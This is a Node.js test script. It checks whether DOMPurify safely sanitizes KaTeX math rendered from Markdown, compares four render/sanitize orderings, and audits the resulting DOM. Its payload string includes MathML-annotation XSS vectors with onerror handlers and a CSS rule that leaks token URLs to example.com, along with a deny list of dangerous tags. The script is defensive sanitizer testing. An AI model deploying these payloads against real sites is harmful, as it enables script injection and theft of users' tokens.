// Math through marked and DOMPurify, proved in jsdom on sample.md plus MathML and stylesheet payloads:
//
//   P0 today:                  DOMPurify.sanitize(marked.parse(md))
//   P1 render, then sanitize:  DOMPurify.sanitize(markdownWithMath().parse(md)), DOMPurify's defaults
//   P2 sanitize, then render:  placeholders through DOMPurify's defaults, then katex.render() into each
//   P3 the recommendation:     renderMarkdown(md), that is P1 with MATH_PURIFY
//
// For each: what DOMPurify removed (its own `removed` list, a report and never a check), and an audit
// that walks the final DOM for anything that runs script, loads a stylesheet, or carries a
// javascript: URL. Then whether DOMPurify changes KaTeX's output at all.
'use strict';
const fs = require('fs');
const path = require('path');
const { DEMO, mathWindow } = require('./common.js');

const PAYLOADS = `

<math><semantics><mrow><mi>x</mi></mrow><annotation encoding="text/html"><img src=x onerror="window.__pwned='ann'"></annotation></semantics></math>

<math><annotation-xml encoding="text/html"><img src=x onerror="window.__pwned='annxml'"></annotation-xml></math>

<math><semantics><annotation><style><img src=x onerror="window.__pwned='annstyle'"></style></annotation></semantics></math>

<annotation>outside math</annotation>

<style>a[href*="token="] { background: url(https://example.com/leak) }</style>
`;
const md = fs.readFileSync(path.join(DEMO, 'sample.md'), 'utf8') + PAYLOADS;

const FORBIDDEN = new Set(['script', 'iframe', 'object', 'embed', 'frame', 'frameset', 'link', 'meta', 'base', 'style', 'foreignobject', 'annotation-xml']);
const URL_ATTRS = new Set(['href', 'src', 'xlink:href', 'action', 'formaction', 'srcdoc', 'data', 'background', 'poster']);
function audit(root) {
  const findings = [];
  for (const node of root.querySelectorAll('*')) {
    const tag = node.localName.toLowerCase();
    if (FORBIDDEN.has(tag)) findings.push(`<${tag}>`);
    for (const attr of Array.from(node.attributes)) {
      const name = attr.name.toLowerCase();
      const value = attr.value.replace(/[\s\u0000-\u001f]/g, '').toLowerCase();
      if (name.startsWith('on')) findings.push(`${name}= on <${tag}>`);
      if (URL_ATTRS.has(name) && /^(javascript|vbscript|data):/.test(value)) findings.push(`${name}=${value.slice(0, 30)} on <${tag}>`);
    }
  }
  return findings;
}
const count = (root, selector) => root.querySelectorAll(selector).length;
function counts(root) {
  return {
    formulas: count(root, '.katex'), displays: count(root, '.katex-display'), katexErrors: count(root, '.katex-error'),
    annotations: count(root, '.katex annotation'), emphasis: count(root, 'p em, p strong'), codeSpans: count(root, 'code'),
  };
}
function tally(removed) {
  const out = {};
  for (const item of removed) {
    const key = item.element ? `<${item.element.nodeName.toLowerCase()}>` : item.attribute ? `${item.attribute.name}= on <${item.from && item.from.nodeName.toLowerCase()}>` : 'other';
    out[key] = (out[key] || 0) + 1;
  }
  return out;
}
function report(name, root, removed) {
  const findings = audit(root);
  console.log(`${name}\n  ${JSON.stringify(counts(root))}\n  DOMPurify removed: ${JSON.stringify(removed)}\n  audit: ${findings.length ? findings.join(', ') : 'nothing that runs, styles the page, or carries a javascript: URL'}`);
}

const window = mathWindow();
const { document, DOMPurify, marked, katex } = window;
const holder = (html) => { const div = document.createElement('div'); div.innerHTML = html; return div; };

// P0
const p0 = holder(DOMPurify.sanitize(marked.parse(md)));
report('P0 today', p0, tally(DOMPurify.removed));
console.log('  what the math became:');
for (const line of p0.innerHTML.split('\n').filter((l) => /a\^|\(\\mathbf|thin space|<li>\\log|a = b \\$/.test(l))) console.log(`    ${line.slice(0, 150)}`);

// P1 and P3 share one KaTeX render, so they sanitize the same string.
const raw = window.markdownWithMath().parse(md);
const p1 = holder(DOMPurify.sanitize(raw));
report('P1 render, then sanitize with DOMPurify defaults', p1, tally(DOMPurify.removed));
const leftover = p1.querySelector('.katex-mathml math');
console.log(`  a <math> after the defaults removed <semantics> and <annotation> ends with the raw TeX: ...${JSON.stringify(leftover.textContent.slice(-45))}`);
const p3 = holder(DOMPurify.sanitize(raw, window.MATH_PURIFY));
report('P3 render, then sanitize with MATH_PURIFY (the recommendation)', p3, tally(DOMPurify.removed));

// P2
const macros = Object.assign({}, window.MATH_MACROS);
const escape = (t) => t.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
const placeholders = window.markdownWithMath((tex, display) => `<span class="math-tex" data-display="${display}">${escape(tex)}</span>`).parse(md);
const p2 = holder(DOMPurify.sanitize(placeholders));
const p2removed = tally(DOMPurify.removed);
for (const span of Array.from(p2.querySelectorAll('span.math-tex'))) {
  katex.render(span.textContent, span, { displayMode: span.dataset.display === 'true', throwOnError: false, trust: false, strict: 'ignore', maxSize: 20, maxExpand: 1000, output: 'htmlAndMathml', globalGroup: true, macros });
}
report('P2 sanitize with DOMPurify defaults, then katex.render()', p2, p2removed);

// Does DOMPurify change KaTeX's output? The same renderToString output, parsed unsanitized (never
// attached to a document, never run) and sanitized, formula by formula.
const before = Array.from(holder(raw).querySelectorAll('.katex')).map((n) => n.outerHTML);
const changed = (after) => before.filter((html, i) => html !== after[i]).length;
console.log(`KaTeX formulas changed by DOMPurify: defaults ${changed(Array.from(p1.querySelectorAll('.katex')).map((n) => n.outerHTML))} of ${before.length}; MATH_PURIFY ${changed(Array.from(p3.querySelectorAll('.katex')).map((n) => n.outerHTML))} of ${before.length}`);
console.log(`KaTeX's red error spans in P3: ${JSON.stringify(Array.from(p3.querySelectorAll('.katex-error')).map((n) => n.textContent.slice(0, 36)))}`);
